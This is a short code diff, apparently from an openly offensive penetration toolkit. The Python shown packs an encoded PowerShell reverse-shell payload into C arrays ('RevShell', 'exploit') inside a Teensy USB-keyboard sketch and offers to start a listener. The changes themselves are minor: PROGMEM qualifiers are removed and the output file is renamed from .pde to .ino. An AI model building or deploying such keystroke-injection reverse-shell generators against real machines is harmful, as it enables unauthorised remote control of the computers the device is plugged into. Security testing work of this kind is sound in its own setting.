@@ -41,18 +41,18 @@ with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
     # read in x amount of bytes
     data_read = int(50)
 
-    output_variable = "#define __PROG_TYPES_COMPAT__\n#define PROGMEM\n#include <avr/pgmspace.h>\n"
+    output_variable = "#define __PROG_TYPES_COMPAT__\n#include <avr/pgmspace.h>\n"
 
     counter = 0
     while True:
         reading_encoded = fileopen.read(data_read).rstrip()
         if not reading_encoded:
             break
-        output_variable += 'const char RevShell_{0}[] PROGMEM = {{"{1}"}};\n'.format(counter, reading_encoded)
+        output_variable += 'const char RevShell_{0}[] = {{"{1}"}};\n'.format(counter, reading_encoded)
         counter += 1
 
 rev_counter = 0
-output_variable += "const char * exploit[] PROGMEM = {\n"
+output_variable += "const char * exploit[] = {\n"
 
 while rev_counter != counter:
     output_variable += "RevShell_{0}".format(rev_counter)
@@ -150,10 +150,10 @@ Keyboard.set_key1(0);
 Keyboard.send_now();
 }
 """)
-print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir + "reports/teensy.pde")))
+print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir + "reports/teensy.ino")))
 if not os.path.isdir(os.path.join(core.setdir + "reports")):
     os.makedirs(os.path.join(core.setdir + "reports"))
-with open(os.path.join(core.setdir + "reports/teensy.pde"), "w") as filewrite:
+with open(os.path.join(core.setdir + "reports/teensy.ino"), "w") as filewrite:
     filewrite.write(teensy)
 choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no] ")
 if choice == "YES":
